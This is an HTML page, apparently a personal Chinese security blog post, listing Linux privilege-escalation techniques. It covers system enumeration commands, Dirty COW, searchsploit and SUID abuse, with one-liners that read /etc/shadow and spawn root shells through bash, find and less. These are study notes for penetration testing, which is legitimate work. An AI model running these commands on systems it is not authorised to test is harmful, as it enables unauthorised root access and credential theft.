@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+  <title>
+    
+    linux提权 丨
+    
+
+    le0
+  </title>
+
+  
+  <link rel="shortcut icon" href="/icon.svg">
+  
+
+  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+  
+  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
+  <script src="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/highlight.min.js"></script>
+  
+
+  <!-- 字体 -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+
+  
+<link rel="stylesheet" href="/css/root.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/post.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <header class="header">
+  <section class="header-container">
+    <a class="logo" href="/">Le0的随便写写</a>
+    <ul class="nav">
+      
+      <li><a href="/archives">archives</a></li>
+      
+    </ul>
+  </section>
+</header>
+  <main class="main">
+    <article class="post">
+  
+  <div class="post-title">linux提权</div>
+  <div class="post-meta">
+    <div class="date">2024 November 21st</div>
+    <div class="tags">
+      
+      <div class="tag-item">安全技术</div>
+      
+    </div>
+  </div>
+  
+
+  <main class="post-content"><h2 id="1-查看信息"><a href="#1-查看信息" class="headerlink" title="1.查看信息"></a>1.查看信息</h2><h3 id="内核以及操作系统信息"><a href="#内核以及操作系统信息" class="headerlink" title="内核以及操作系统信息"></a>内核以及操作系统信息</h3><p>uname -a                 打印所有可用的系统信息<br>uname -r                  内核版本<br>uname -n                 系统主机名。<br>uname -m                查看系统内核架构（64位&#x2F;32位）<br>hostname                系统主机名<br>cat &#x2F;proc&#x2F;version    内核信息<br>cat &#x2F;etc&#x2F;-release     分发信息<br>cat &#x2F;etc&#x2F;issue          分发信息<br>cat &#x2F;proc&#x2F;cpuinfo    CPU信息</p>
+<h3 id="用户和组"><a href="#用户和组" class="headerlink" title="用户和组"></a>用户和组</h3><p>cat &#x2F;etc&#x2F;passwd     列出系统上的所有用户<br>cat &#x2F;etc&#x2F;group        列出系统上的所有组<br><code>grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &#39;\$3 == 0 &#123; print \$1&#125;&#39;</code>     列出所有的超级用户账户<br>whoami                  查看当前用户<br>w                             谁目前已登录，他们正在做什么<br>last                          最后登录用户的列表<br>lastlog                     所有用户上次登录的信息<br>lastlog –u %username%  有关指定用户上次登录的信息<br>lastlog |grep -v “Never”   以前登录用户的完</p>
+<p>whoami        当前用户名<br>id                  当前用户信息<br>cat &#x2F;etc&#x2F;sudoers  谁被允许以root身份执行<br>sudo -l                  当前用户可以以root身份执行操作</p>
+<h3 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h3><p>env        显示环境变量<br>set         现实环境变量<br>echo %PATH 路径信息<br>history            显示当前用户的历史命令记录<br>pwd                 输出工作目录<br>cat &#x2F;etc&#x2F;profile   显示默认系统变量<br>cat &#x2F;etc&#x2F;shells    显示可用的shell</p>
+<h2 id="2-脏牛漏洞提权"><a href="#2-脏牛漏洞提权" class="headerlink" title="2.脏牛漏洞提权"></a>2.脏牛漏洞提权</h2><pre><code class="highlight plaintext">漏洞编号：CVE-2016-5195
+
+漏洞名称：脏牛（Dirty COW）
+
+漏洞危害：低权限用户利用该漏洞技术可以在全版本上实现本地提权
+
+影响范围：Linux kernel &gt;=2.6.22  并且Android也受影响</code></pre>
+
+<h2 id="3-内核漏洞提权"><a href="#3-内核漏洞提权" class="headerlink" title="3.内核漏洞提权"></a>3.内核漏洞提权</h2><pre><code class="highlight plaintext">Uname -a
+
+Searchsplolit linux
+
+如果linux内核版本小于2.6.22或者脏牛无法成功时，我们需要查看其他版本的内核漏洞。这时我们就用到了kali linux，自身所拥有的searchspolit可以帮助我们查看各种linux发行版本的漏洞。而searchs
+
+polit的使用也很简单，只需要在后面跟上限定条件即可。</code></pre>
+
+<h2 id="4-suid提权"><a href="#4-suid提权" class="headerlink" title="4.suid提权"></a>4.suid提权</h2><ul>
+<li>在本地查找符合条件的文件: Nmap Vim find Bash More Less Nano cp</li>
+</ul>
+<pre><code class="highlight plaintext">find / -user root -perm -4000 -print 2&gt;/dev/null  
+find / -perm -u=s -type f 2&gt;/dev/null  
+find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \</code></pre>
+
+<ul>
+<li>在Metasploit中也有一个模块可以通过SUID Nmap进行提权<br><code> exploit/unix/local/setuid_nmap</code></li>
+<li>如果find以SUID权限运行，所有通过find执行的命令都会以root权限运行</li>
+</ul>
+<pre><code class="highlight plaintext">touch test  
+find test -exec whoami \</code></pre>
+
+<ul>
+<li>Vim的主要用途是用作文本编辑器。 但是，如果以SUID运行，它将继承root用户的权限，因此可以读取系统上的所有文件<br><code>vim /etc/shadow</code></li>
+<li>bash 以下命令将以root身份打开一个bash shell</li>
+</ul>
+<pre><code class="highlight plaintext">bash -p  
+bash-3.2# id  
+uid=500(cow) gid=500(cow) euid=0(root) groups=500(cow)</code></pre>
+
+<ul>
+<li>Less 程序less也可以执行提权后的shell</li>
+</ul>
+<pre><code class="highlight plaintext">less /etc/passwd  
+!/bin/sh</code></pre>
+</main>
+
+</article>
+
+
+<script src="/js/highlight.js"></script>
+
+  </main>
+  <footer class="footer">
+  
+  <span>Copyright © 2024 typole0</span>
+  
+</footer>
+  
+<script src="/js/theme.js"></script>
+
+</body>
+
+</html>
